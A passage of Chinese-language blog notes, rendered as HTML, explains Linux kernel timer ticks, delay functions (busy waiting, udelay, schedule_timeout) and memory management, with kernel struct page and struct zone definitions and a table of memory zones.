class="line"><span class="function"></span>&#123;</span><br><span class="line">	jiffies_64 += ticks;</span><br><span class="line">	calc_global_load(ticks); <span class="comment">/* 更新时钟 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_process_times</span><span class="params">(<span class="keyword">int</span> user_tick)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span> =</span> current;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 注意:这个定时器中断上下文也必须考虑在内 */</span></span><br><span class="line">	account_process_tick(p, user_tick);</span><br><span class="line">	run_local_timers(); <span class="comment">/* 标记了一个软中段,去处理所有到期的定时器 */</span></span><br><span class="line">	rcu_check_callbacks(user_tick);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IRQ_WORK</span></span><br><span class="line">	<span class="keyword">if</span> (in_irq())</span><br><span class="line">		irq_work_tick();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	scheduler_tick(); <span class="comment">/* 负责减少当前运行进程的时间片计数值,必要时设置need_resched */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_POSIX_TIMERS))</span><br><span class="line">		run_posix_cpu_timers(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>上述场景中，写锁必须要优先于读锁（因为 <strong>xtime</strong> 必须及时更新），而且写锁的使用者很少（一般只有系统定期更新 <strong>xtime</strong> 的线程需要持有这个锁）</li>
<li>这正是 [顺序锁] 的应用场景</li>
</ul>
<p><strong>延迟运行</strong></p>
<p>除了使用定时器和下半部机制以外，还需要其他方法来推迟执行任务：</p>
<ul>
<li>忙等待：最简单的延迟方法</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 延迟100个jiffies */</span> </span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> delay = jiffies + <span class="number">100</span>; </span><br><span class="line"> <span class="keyword">while</span> (time_before(jiffies, delay))</span><br><span class="line">     cond_resched(); <span class="comment">/* 运行内核重新调度执行其他任务(只有在设置need_resched标准后才会生效) */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 延迟2s */</span> </span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> delay = jiffies + <span class="number">2</span>*HZ; </span><br><span class="line"> <span class="keyword">while</span> (time_before(jiffies, delay))</span><br><span class="line">     cond_resched();</span><br></pre></td></tr></table></figure>
<ul>
<li>短延迟：短暂的延迟，而且还要求延迟的时间很精确</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">udelay</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> usecs)</span></span>; <span class="comment">/* 单位-us */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ndelay</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> nsecs)</span></span>; <span class="comment">/* 单位-ns */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mdelay(n)	udelay((n) * 1000) <span class="comment">/* 单位-ms */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>schedule_timeout()：让需要延迟运行的任务睡眠到指定时间后，再运行（底层还是定时器）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">long</span> __sched <span class="title">schedule_timeout</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">long</span> timeout)</span></span>; <span class="comment">/* 单位-jiffies */</span></span><br></pre></td></tr></table></figure>
<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p><strong>页</strong></p>
<p>内存最基本的管理单元是页，同时按照内存地址的大小，大致分为3个区，页的大小与体系结构有关，在 x86 结构中一般是 4KB 或者 8KB</p>
<p>可以通过 <code>getconf</code> 命令来查看系统的 page 的大小： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 getconf -a | grep -i <span class="string">&#x27;page&#x27;</span></span><br><span class="line">PAGESIZE                           <span class="number">4096</span></span><br><span class="line">PAGE_SIZE                          <span class="number">4096</span></span><br><span class="line">_AVPHYS_PAGES                      <span class="number">514073</span></span><br><span class="line">_PHYS_PAGES                        <span class="number">995803</span></span><br></pre></td></tr></table></figure>
<p>用于描述页的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;    <span class="comment">/* 存放页的状态 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> _count;        <span class="comment">/* 页的引用计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span> _mapcount;    <span class="comment">/* 已经映射到mms的pte的个数 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>        <span class="comment">/* 用于slab层 */</span></span><br><span class="line">            u16 inuse;</span><br><span class="line">            u16 objects;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;        <span class="comment">/* 此page作为私有数据时,指向私有数据 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>    <span class="comment">/* 此page作为页缓存时,指向关联的address_space */</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SPLIT_PTLOCKS</span></span><br><span class="line">        <span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab</span>;</span>    <span class="comment">/* 指向slab层 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">first_page</span>;</span>    <span class="comment">/* 尾部复合页中的第一个页 */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">pgoff_t</span> index;        <span class="comment">/* Our offset within mapping */</span></span><br><span class="line">        <span class="keyword">void</span> *freelist;        <span class="comment">/* SLUB: freelist req slab lock */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>    <span class="comment">/* 将页关联起来的链表项 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">virtual</span>;            <span class="comment">/* 页的虚拟地址 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WANT_PAGE_DEBUG_FLAGS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> debug_flags;    <span class="comment">/* Use atomic bitops on this */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KMEMCHECK</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kmemcheck wants to track the status of each byte in a page; this</span></span><br><span class="line"><span class="comment">     * is a pointer to such a status block. NULL if not tracked</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> *shadow;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags; <span class="comment">/* 存放页的状态 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 页面缓存和匿名页面 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">			<span class="keyword">pgoff_t</span> index;	</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* slab, slob and slub */</span></span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 私有pages */</span></span><br><span class="line">					<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">					<span class="keyword">int</span> pages;	<span class="comment">/* Nr of pages left */</span></span><br><span class="line">					<span class="keyword">int</span> pobjects;	<span class="comment">/* Approximate count */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">					<span class="keyword">short</span> <span class="keyword">int</span> pages;</span><br><span class="line">					<span class="keyword">short</span> <span class="keyword">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* not slob */</span></span><br><span class="line">			<span class="comment">/* Double-word boundary */</span></span><br><span class="line">			<span class="keyword">void</span> *freelist;		<span class="comment">/* first free object */</span></span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="keyword">void</span> *s_mem;	<span class="comment">/* slab: first object */</span></span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">long</span> counters;		<span class="comment">/* SLUB */</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span>			<span class="comment">/* SLUB */</span></span><br><span class="line">					<span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">					<span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">					<span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 复合页尾页 */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> compound_head;	<span class="comment">/* Bit zero is set */</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">/* First tail page only */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">char</span> compound_dtor;</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">char</span> compound_order;</span><br><span class="line">			<span class="keyword">atomic_t</span> compound_mapcount;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 复合页第二尾页 */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> _compound_pad_1;	<span class="comment">/* compound_head */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> _compound_pad_2;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span></span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 页面表页面 */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> _pt_pad_1;	<span class="comment">/* compound_head */</span></span><br><span class="line">			<span class="keyword">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> _pt_pad_2;	<span class="comment">/* mapping */</span></span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> <span class="comment">/* x86 pgds only */</span></span><br><span class="line">				<span class="keyword">atomic_t</span> pt_frag_refcount; <span class="comment">/* powerpc */</span></span><br><span class="line">			&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">			<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">			<span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* ZONE_DEVICE pages */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span> <span class="comment">/* 指向主机设备页面映射 */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> hmm_data;</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> _zd_pad_1;	<span class="comment">/* uses mapping */</span></span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span> <span class="comment">/* 使用它通过RCU释放页面 */</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span>		<span class="comment">/* This union is 4 bytes in size. */</span></span><br><span class="line">		<span class="keyword">atomic_t</span> _mapcount; <span class="comment">/* 如果页面可以映射到用户空间,则编码页面表引用此页面的次数 */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> page_type; <span class="comment">/* 如果页面既不是PageSlab,也不可映射到用户空间,则此处存储的值可能有助于确定此页面的用途 */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> active;		<span class="comment">/* SLAB */</span></span><br><span class="line">		<span class="keyword">int</span> units;			<span class="comment">/* SLOB */</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */</span></span><br><span class="line">	<span class="keyword">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">mem_cgroup</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment">	 * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment">	 * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment">	 * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment">	 * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment">	 * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="keyword">virtual</span>;			<span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">					   not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">	<span class="keyword">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>为每个物理页都要分配一个这样的结构</li>
</ul>
<p><strong>区</strong></p>
<p>页是内存管理的最小单元，内核将内存按地址的顺序分成了不同的区</p>
<ul>
<li>有的硬件只能访问有专门的区，其实一般主要关注的区只有3个：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>区</strong></th>
<th><strong>描述</strong></th>
<th><strong>物理内存</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ZONE_DMA</td>
<td>DMA使用的页</td>
<td>&lt; 16MB</td>
</tr>
<tr>
<td>ZONE_NORMAL</td>
<td>正常可寻址的页</td>
<td>16MB～896MB</td>
</tr>
<tr>
<td>ZONE_HIGHMEM</td>
<td>动态映射的页</td>
<td>&gt; 896MB 某些硬件只能直接访问内存地址，不支持内存映射，对于这些硬件内核会分配 ZONE_DMA 区的内存。</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>某些硬件的内存寻址范围很广，比虚拟寻址范围还要大的多，那么就会用到 ZONE_HIGHMEM 区的内存</li>
<li>而 ZONE_DMA 用于I/O设备直接存储器访问（网卡就会使用 DMA 技术）</li>
<li>对于大部分的内存申请，只要用 ZONE_NORMAL 区的内存即可</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> watermark[NR_WMARK];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	我们不知道我们要分配的内存是否将是freeable的或者它最终将被释放</span></span><br><span class="line"><span class="comment">	因此为了避免完全浪费几GB的RAM,我们必须保留一些较低区域的内存(否则我们冒着在较低区域上运行OOM的风险,尽管在较高区域上有大量的可用RAM)</span></span><br><span class="line"><span class="comment">	如果sysctl_lowmem_reserve_ratio sysctl发生更改,则会在运行时重新计算此数组</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="keyword">int</span> node;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>	*<span class="title">zone_pgdat</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		*pageblock_flags; <span class="comment">/* pageblock_nr_pages块的标志 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		zone_start_pfn;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment">	 * holes, which is calculated as:</span></span><br><span class="line"><span class="comment">	 * 	spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment">	 * is calculated as:</span></span><br><span class="line"><span class="comment">	 *	present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment">	 * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment">	 * bootmem allocator):</span></span><br><span class="line"><span class="comment">	 *	managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment">	 * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment">	 * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment">	 * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment">	 * and thresholds.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Locking rules:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment">	 * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment">	 * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment">	 * quite infrequently.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment">	 * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment">	 * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment">	 * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment">	 * present_pages should get_online_mems() to get a stable value.</span></span><br><span 